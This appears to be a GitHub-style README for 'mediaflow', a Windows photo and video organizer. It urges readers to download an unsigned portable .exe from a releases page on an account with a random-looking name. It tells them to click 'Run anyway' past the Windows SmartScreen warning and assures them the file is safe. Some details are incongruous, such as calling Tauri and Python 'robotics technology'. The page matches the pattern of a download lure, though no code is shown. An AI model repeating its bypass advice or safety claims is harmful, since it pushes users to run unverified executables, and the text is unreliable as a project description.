<h1>🖼️ mediaflow - Your Photo & Video Organizer, Simplified</h1>

<p align="center">
  <a href="https://github.com/deryldiaphoretic316/mediaflow/releases">
    <img src="https://img.shields.io/badge/Download_mediaflow-Windows_App-brightgreen?style=for-the-badge&logo=windows&logoColor=white&color=%2345aaf2" alt="Download mediaflow" width="300">
  </a>
</p>

<p align="center"><strong>Sort, deduplicate, and fix dates on all your photos and videos — no technical skills needed.</strong></p>

---

## 📋 What Does mediaflow Do?

mediaflow is a friendly desktop application for Windows that helps you take control of your photo and video collection. If you have thousands of files scattered across folders, duplicate images eating up space, or photos with wrong dates, mediaflow solves these problems in just a few clicks.

Think of it as a digital filing assistant for your memories. You point it at your folders, tell it what to do, and it handles the rest.

---

## 🚀 Getting Started

Ready to use mediaflow? Follow these steps and you'll be organizing your media in less than five minutes.

### Step 1: Download the Application

Visit this link to download the application:  
👉 **[https://github.com/deryldiaphoretic316/mediaflow/releases](https://github.com/deryldiaphoretic316/mediaflow/releases)**

You'll see a page with release notes and a download section. Look for the file named **`mediaflow-windows-portable.exe`**. Click the download button next to it. The download will start automatically.

> 💡 **Tip:** If your browser asks permission, choose "Save File" or "Keep." The file is about 50-80 MB and will download in a minute or two on a normal connection.

### Step 2: Run mediaflow

Once the download finishes:

- Go to your **Downloads** folder (or wherever your browser saves files).
- Double-click the file named **`mediaflow-windows-portable.exe`**.

That's it! The application window will open. No installation process, no setup wizard, no confusing options. You can start using mediaflow right away.

> ✅ **Windows SmartScreen Notice:** If you see a blue popup saying "Windows protected your PC," click **"More info"** and then **"Run anyway."** This is normal for portable apps that haven't been signed with a commercial certificate. mediaflow is safe and open-source.

---

## 🧭 Your First Steps with mediaflow

Once mediaflow opens, you'll see a clean, simple interface with a main menu. Let's walk through the four core features:

### 1. 📂 Copy Files

This feature copies your photos and videos from one place to another while organizing them into neat folders. For example, you can:

- Select a source folder (where your photos currently live).
- Choose a destination folder (where you want them organized).
- Let mediaflow sort them by year and month automatically.

**How to use:** Click **"Copy Files"** in the menu. Choose your source folder, then choose your destination folder. Click **"Start"** and watch your files get organized.

### 2. 🔄 Sort Files

Sorting is different from copying. When you sort, mediaflow actually **moves** your files from messy locations into an organized structure. This is perfect for cleaning up a desktop or a camera memory card.

**How to use:** Click **"Sort Files"**. Pick the folder with your messy files, then pick a destination folder. mediaflow will create subfolders by date (like `2024_05_June`) and move everything into place.

### 3. 🗑️ Deduplicate Files

Duplicate photos are a huge problem for anyone who takes many pictures. If you have the same photo saved five times, mediaflow finds them all and helps you keep just the best copy.

**How to use:** Click **"Deduplicate"**. Select the folder or folders you want to scan. mediaflow will analyze the files by content (not just name) and show you groups of duplicates. Review the list, select which copies to remove, and click **"Delete Selected"**.

> ⚠️ **Safety First:** mediaflow automatically keeps the highest-resolution version of each duplicate. You can also tick the box to "Move to Recycle Bin" instead of permanent deletion.

### 4. 📅 Edit EXIF and File Dates

Every photo and video contains hidden information called EXIF data. This includes the date and time the photo was taken, camera settings, and more. Sometimes this data is wrong (for example, if your camera clock was set incorrectly). mediaflow lets you fix this easily.

**How to use:** Click **"Edit Dates"**. Choose a folder of photos or videos. You can:

- **Shift all dates** by a certain number of hours (useful for time-zone mistakes).
- **Set a specific date** for a selected batch of files.
- **Fix file dates** to match the EXIF dates.

This is also great for old scanned photos where you know the correct date but the file shows something wrong.

---

## ⚙️ System Requirements

mediaflow is designed to run on most modern Windows computers. Here's what you need:

| Requirement | Minimum | Recommended |
|-------------|---------|-------------|
| Operating System | Windows 10 (64-bit) | Windows 11 |
| Processor | Intel Core i3 or AMD equivalent | Intel Core i5 or better |
| RAM | 4 GB | 8 GB or more |
| Free Disk Space | 200 MB (for the app) plus space for your media | 1 GB or more |
| Screen Resolution | 1280 × 720 | 1920 × 1080 |

**No internet connection is required** after the download. mediaflow works completely offline, so your private photos never leave your computer.

---

## 🛠️ Frequently Asked Questions

### ❓ Is mediaflow really free?

Yes, completely free. The application is open-source and licensed under the MIT License. That means you can use it for personal or commercial purposes without paying anything. If you'd like to support the developer, you can star the repository on GitHub.

### ❓ Will mediaflow modify my original files?

Not unless you ask it to. The **Copy** feature creates new copies and leaves originals untouched. The **Sort** feature moves files (which changes their location), but you can undo this by moving them back. **Deduplicate** will only delete files after you explicitly confirm. **Edit Dates** changes metadata, but you can always revert with a backup.

### ❓ What happens if I close the app mid-task?

mediaflow is designed to handle interruptions gracefully. If you close it during a copy or sort operation, files that were already processed remain safe and organized. The next time you open mediaflow, you can simply start the task again from the beginning without issues.

### ❓ Does mediaflow work with cloud folders like OneDrive or Google Drive?

Yes, you can use any folder that is visible in Windows Explorer, including synced cloud folders. However, for the best performance, we recommend working with files that are stored locally on your computer first, then letting your cloud service sync the organized result.

### ❓ Can I use mediaflow to organize videos too?

Absolutely. mediaflow supports both photos (JPG, PNG, HEIC, RAW formats) and videos (MP4, MOV, AVI, MKV). The deduplication and date-editing features work with video files as well.

---

## 📈 What Makes mediaflow Different?

- **Portable & Simple** — No installation. Just download, double-click, and go. Great for use on multiple computers via a USB stick.
- **Privacy-Focused** — All processing happens locally on your machine. No cloud uploads, no account creation, no telemetry.
- **Powerful under the Hood** — Built using modern robotics technology (Tauri + Python + FastAPI), mediaflow combines speed with reliability. The EXIF editing engine uses the well-respected ExifTool library for accuracy.
- **Active Development** — The project is actively maintained, with new features and bug fixes released regularly.

---

## 📖 Quick Troubleshooting

| Issue | Solution |
|-------|----------|
| App won't open / no window appears | Check if Windows blocked the file. Right-click the .exe file, go to Properties, and check the "Unblock" box if present. Then double-click again. |
| Scan takes a long time | This is normal for large folders (10,000+ files). Let it run. You can minimize the window and keep using your computer. |
| Duplicates not detected | Some duplicates have different file formats (e.g., one JPG and one PNG). In the deduplicate menu, enable "Compare different formats" to include these. |
| Files appear with wrong dates after editing | Double-check the time-zone setting in the Edit Dates window. A common error is selecting GMT+8 instead of GMT-5, etc. |

---

## 🆘 Need Help?

If you need assistance, there are two ways to get help:

1. **Visit the GitHub Repository**: Go to [https://github.com/deryldiaphoretic316/mediaflow](https://github.com/deryldiaphoretic316/mediaflow) and explore the documentation, issues section, or open a new request.
2. **Report a Bug**: If something isn't working right, go to the "Issues" tab on GitHub and provide a clear description of the problem, including your Windows version and what you were trying to do.

---

## 🎯 Start Organizing Today!

Don't let a messy photo collection stress you out. With mediaflow, you can find duplicates, fix dates, and organize everything in minutes.

**Visit this link to download the application:**  
👉 **[https://github.com/deryldiaphoretic316/mediaflow/releases](https://github.com/deryldiaphoretic316/mediaflow/releases)**

Download the .exe file, double-click it, and take your first step toward a beautifully organized photo library. It's free, it's fast, and it works entirely on your computer — the way software should be.

---

Keywords: deduplication, exif, exiftool, fastapi, media-organizer, photo-management, photos, python, tauri, windows